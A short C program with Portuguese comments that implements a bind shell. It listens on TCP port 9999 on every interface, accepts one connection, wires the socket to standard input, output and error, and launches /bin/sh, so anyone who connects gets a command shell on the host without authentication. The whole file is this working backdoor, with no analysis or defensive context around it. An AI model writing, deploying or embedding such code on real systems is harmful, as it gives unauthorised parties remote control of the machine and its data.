#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    int sock;
    struct sockaddr_in server;
    char *sh = "/bin/sh";

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY; // escuta em todas as interfaces
    server.sin_port = htons(9999);        // Substitua pela porta que deseja escutar

    bind(sock, (struct sockaddr *)&server, sizeof(server));
    listen(sock, 3);

    int new_sock = accept(sock, NULL, NULL);
    dup2(new_sock, 0); // stdin
    dup2(new_sock, 1); // stdout
    dup2(new_sock, 2); // stderr
    execve(sh, NULL, NULL);

    close(sock);
    return 0;
}
